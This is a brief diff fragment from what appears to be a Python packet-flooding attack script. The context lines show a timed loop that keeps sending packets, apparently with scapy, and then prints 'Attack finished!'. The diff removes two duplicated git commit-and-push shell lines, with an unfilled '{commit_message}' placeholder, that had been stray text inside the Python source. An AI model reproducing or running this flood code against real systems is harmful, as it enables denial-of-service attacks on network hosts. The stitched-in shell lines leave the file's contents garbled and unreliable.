@@ -25,5 +25,3 @@ while time.time() - start_time < atack_duration:
         send(packet, verbose=False)
     time.sleep(1)
 print("Attack finished!")
-git commit -m "{commit_message}" && git push
-git commit -m "{commit_message}" && git push
